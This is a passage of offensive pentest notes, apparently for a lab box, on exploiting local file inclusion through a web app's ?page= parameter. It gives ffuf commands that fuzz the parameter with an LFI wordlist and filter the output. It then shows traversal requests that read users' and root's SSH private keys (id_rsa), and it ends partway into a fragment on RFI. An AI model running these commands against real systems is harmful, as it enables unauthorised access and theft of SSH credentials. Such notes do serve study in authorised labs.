...
## Try director traversal via the ?page= (Find ?page= parameter through manual enumeration or Gobuster)
```bash
# Automated with Ffuf
ffuf -w <WORDLIST> -u 'URL+PARAMETER=FUZZ'

ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://192.168.215.16/meteor/index.php?page=FUZZ'
# After that, filter results down with -fs
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://192.168.215.16/meteor/index.php?page=FUZZ' -fs 7046
```
...
## Grab SSH Key since we have file path (Requires Username or Usernames)

```bash
# If applicable, create username list
nano users.txt
# Run it against id_rsa folder
ffuf -w users.txt -u 'http://192.168.215.16/meteor/index.php?page=/home/FUZZ/.ssh/id_rsa' -fs 7046
# Try root directly
http://192.168.215.16/meteor/index.php?page=../../../../../../../../../root/.ssh/id_rsa
...
```bash
# RFIs are less common than LFIs
